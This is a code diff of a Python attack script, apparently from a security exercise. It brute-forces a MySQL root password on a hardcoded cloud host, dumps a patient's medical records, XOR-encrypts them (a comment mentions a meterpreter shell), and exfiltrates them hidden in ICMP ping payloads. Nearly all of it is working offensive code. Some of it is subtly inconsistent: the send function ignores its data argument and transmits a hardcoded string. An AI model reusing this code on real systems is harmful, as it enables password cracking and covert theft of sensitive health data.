@@ -2,14 +2,17 @@ import mysql.connector as mysql
 import os, sys, socket, struct, select, time
 import datetime
 import re
+from itertools import cycle
+import random
+import string
 
 # Crack password
 
 # function that checks if pw is correct
-def connect(pw):
+def connect(pw, host):
     try:
         db = mysql.connect(
-            host = "ec2-54-161-19-249.compute-1.amazonaws.com",
+            host = host,
             user = "root",
             passwd = pw
         )
@@ -17,38 +20,57 @@ def connect(pw):
     except:
         return("wrong")
 
-# we need a good wordlist...
-wordlist=[]
-
-for word in wordlist:
-    print(word)
-    if connect(word)=='success':
-        pw = word
-
-# Get data
-db = mysql.connect(
-    host = "ec2-54-161-19-249.compute-1.amazonaws.com",
-    user = "root",
-    passwd = pw
-)
-
-cursor = db.cursor()
-
-cursor.execute("use medical_data;")
-
-cursor.execute("select * from patients where name = 'Our Guy';")
-result = cursor.fetchall()
+# Cracks the password, given a wordlist and a sql host (as root)
+def getPassword(wordlist, host):
+    for word in wordlist:
+        print(word)
+        if connect(word, host)=='success':
+            pw = word
+    return pw
 
 # helper function to make result a string
-def string(x):
+def query_to_string(x):
     if isinstance(x, int): return str(x)
     elif isinstance(x, datetime.date): return x.strftime("%Y-%m-%d")
-
     return x
 
-#result in string format without nonalphanumeric chars.
-res_str = " ".join([i[0] for i in cursor.description]) + " ".join([" ".join([string(x) for x in tup]) for tup in result])
-res_str = re.sub(r'[^a-zA-Z\d\s\.]', "", res_str)
+# Get data
+def get_data(pw, host):
+    db = mysql.connect(
+        host = host,
+        user = "root",
+        passwd = pw
+    )
+
+    cursor = db.cursor()
+
+    cursor.execute("use medical_data;")
+
+    cursor.execute("select * from patients where name = 'Our Guy';")
+    result = cursor.fetchall()
+    data = " ".join([i[0] for i in cursor.description]) + " ".join([" ".join([query_to_string(x) for x in tup]) for tup in result])
+
+    # result in string format without nonalphanumeric chars.
+    data = re.sub(r'[^a-zA-Z\d\s\.]', "", data)
+    return data
+
+# helper function for xor two strings
+def XOR(plaintext, key):
+    return ''.join(chr(ord(x) ^ ord(y)) for (x,y) in zip(plaintext, cycle(key)))
+
+# helper function to generate password string
+def passwordGen(stringLength):
+    letters = string.ascii_letters
+    return ''.join(random.choice(letters) for i in range(stringLength))
+
+# takes list of tuples, outputs encrypted string.
+def encrypt_data(data):
+
+    # simple xor encryption, key is created and recorded in meterpreter shell.
+    key_len = len(data.encode('utf-8'))
+    key = passwordGen(key_len)
+    enc_data = XOR(data, key)
+    return enc_data, key
 
 # Exfiltrate data in a packet header
 def checksum(data):
@@ -63,7 +85,7 @@ def checksum(data):
     s = ~s & 0xFFFF
     return s
 
-def sendOnePing(seq, dest_addr, ttl, timeout=2, packetsize=64):
+def sendOnePing(seq, dest_addr, ttl, data_to_send, timeout=2, packetsize=64):
     if packetsize:
         ICMP_LEN_BYTES = packetsize
     else:
@@ -89,7 +111,8 @@ def sendOnePing(seq, dest_addr, ttl, timeout=2, packetsize=64):
         "bbHHh", ICMP_ECHO_REQUEST,
         ICMP_CODE, ICMP_CHECKSUM, ICMP_ID, ICMP_SEQ)
     bytesInDouble = struct.calcsize("d")
-    data = res_str
+    data = "id ssn name birthdate contactinfo diagnosis severity drugName dosage1001 123456789 Our Guy 20200420 emailemail.com a bad case of monday mornings 3 coffee 20 1002 123456789 Our Guy 20200420 emailemail.com coronavirus 8 tylenol 10 1003 123456789 Our Guy 20200420 emailemail.com Bowdens Malady 5 pescaline D 6"
+    print(data.encode())
     data = struct.pack("d", time.time()) + data.encode()
 
     ICMP_CHECKSUM = checksum(header + data)
@@ -101,7 +124,7 @@ def sendOnePing(seq, dest_addr, ttl, timeout=2, packetsize=64):
     packet = header + data
 
     s.sendto(packet, (dest_addr, 0))
-
+    print("sent ping. Waiting for reply.")
     while True:
         try:
             recPacket, addr = s.recvfrom(1024)
@@ -115,7 +138,7 @@ def sendOnePing(seq, dest_addr, ttl, timeout=2, packetsize=64):
                     "d", recPacket[28:28 + bytesInDouble])[0]
                 delay = (timeReceived - timeSent) * 1000
                 print (
-                    "%d Bytes from %s : icmp_seq=%d ttl=%d time=%0.4fms data=%s"
+                    "SUCCESS! %d Received Bytes from %s : icmp_seq=%d ttl=%d time=%0.4fms data=%s"
                     % (len(recPacket)-28, addr[0], ICMP_SEQ, _ttl, delay, recPacket[36:]))
                 time.sleep(1)
                 return delay
@@ -125,5 +148,19 @@ def sendOnePing(seq, dest_addr, ttl, timeout=2, packetsize=64):
         except Exception as e:
             raise e
 
-#replace ip
-sendOnePing(1, ip, 102)
+def main():
+    host = "ec2-54-161-19-249.compute-1.amazonaws.com"
+    # hardcoded wordlist based on social engineering
+    # i.e. we saw a sticky note on the target machine that read "P_ _ _ _ _ _ _ ! # # #"
+    wordlist=["Password!123"]
+    password = getPassword(wordlist, host)
+    print("got password:", password)
+    sql_result = get_data(password, host)
+    print("got sql data:", sql_result)
+    data, key = encrypt_data(sql_result)
+    print("encrypted data:", data)
+    print("with key:", key)
+    sendOnePing(1, host, 102, data)
+
+if __name__ == "__main__":
+    main()
